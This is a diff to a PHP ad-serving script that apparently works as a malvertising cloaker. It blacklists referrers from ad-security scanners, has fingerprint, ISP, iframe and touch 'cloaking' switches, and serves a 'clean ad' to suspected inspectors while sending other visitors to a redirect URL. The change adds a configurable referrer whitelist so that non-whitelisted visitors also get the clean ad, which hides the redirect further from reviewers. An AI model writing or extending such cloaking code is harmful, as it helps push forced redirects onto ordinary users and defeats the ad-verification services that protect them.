@@ -56,6 +56,7 @@
 	$blacklistedContinents 	= array();
 
 	$blacklistedReferrers	= array("rtbfy", "mediatrust", "geoedge");
+	$whitelistedReferrers	= array();
 
 	$blockedParameterValues = array("pubid" 		=> array("0"),
 									"cachebuster" 	=> array("0"),
@@ -196,22 +197,24 @@
 
 	$adConfig = processConfig($configFilename);
 
-	$redirectUrl 					= array_key_exists("RedirectUrl", $adConfig) ? $adConfig['RedirectUrl'] : "";
-	$redirectMethod 				= array_key_exists("Method", $adConfig) ? $adConfig['Method'] : "";
-	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig['RedirectTimeout'] : 3000;
+	$redirectUrl 					= array_key_exists("RedirectUrl", $adConfig) ? $adConfig["RedirectUrl"] : "";
+	$redirectMethod 				= array_key_exists("Method", $adConfig) ? $adConfig["Method"] : "";
+	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig["RedirectTimeout"] : 3000;
 	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] === "false" ? false : true;
-	$adCountry 						= array_key_exists("CountryCode", $adConfig) ? $adConfig['CountryCode'] : "";
-	$blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $adConfig) ? preg_split("/\|/", $adConfig['ProvinceBlackList'], -1, PREG_SPLIT_NO_EMPTY) : array();
-	$blacklistedCities 				= array_key_exists("CityBlackList", $adConfig) ? preg_split("/\|/", $adConfig['CityBlackList'], -1, PREG_SPLIT_NO_EMPTY) : array();
+	$adCountry 						= array_key_exists("CountryCode", $adConfig) ? $adConfig["CountryCode"] : "";
+	$blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $adConfig) ? preg_split("/\|/", $adConfig["ProvinceBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
+	$blacklistedCities 				= array_key_exists("CityBlackList", $adConfig) ? preg_split("/\|/", $adConfig["CityBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
 	$canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $adConfig) && $adConfig["CanvasFingerprintCheckEnabled"] === "false" ? false : true;
-	$blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $adConfig) ? $adConfig['BlockedCanvasFingerprints'] : "";
-	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig['OutputMethod'] : "";
+	$blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $adConfig) ? $adConfig["BlockedCanvasFingerprints"] : "";
+	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig["OutputMethod"] : "";
 	$trackingPixelEnabled			= array_key_exists("TrackingPixelEnabled", $adConfig) && $adConfig["TrackingPixelEnabled"] === "false" ? false : true;
-	$trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $adConfig) ? $adConfig['TrackingPixelUrl'] : "";
+	$trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $adConfig) ? $adConfig["TrackingPixelUrl"] : "";
 	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
 	$ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $adConfig) && $adConfig["ISPCloakingEnabled"] === "false" ? false : true;
 	$iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $adConfig) && $adConfig["IFrameCloakingEnabled"] === "false" ? false : true;
 	$touchCloakingEnabled 			= array_key_exists("TouchCloakingEnabled", $adConfig) && $adConfig["TouchCloakingEnabled"] === "false" ? false : true;
+	$blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["BlacklistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
+	$whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["WhitelistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
 
 	if (empty($redirectUrl))
 	{
@@ -256,10 +259,35 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is in blacklist");
+					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is in blacklist.");
 				}
 
 				break;
+			}
+		}
+
+		if (!$serveCleanAd && !empty($whitelistedReferrers))
+		{
+			$matchedWhitelistedReferrer = false;
+
+			foreach ($whitelistedReferrers as $whitelistedReferrer)
+			{
+				if (strpos($_SERVER['HTTP_REFERER'], $whitelistedReferrer) !== false)
+				{
+					$matchedWhitelistedReferrer = true;
+
+					break;
+				}
+			}
+
+			if (!$matchedWhitelistedReferrer)
+			{
+				$serveCleanAd = true;
+
+				if ($loggingEnabled)
+				{
+					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
+				}				
 			}
 		}
 	}
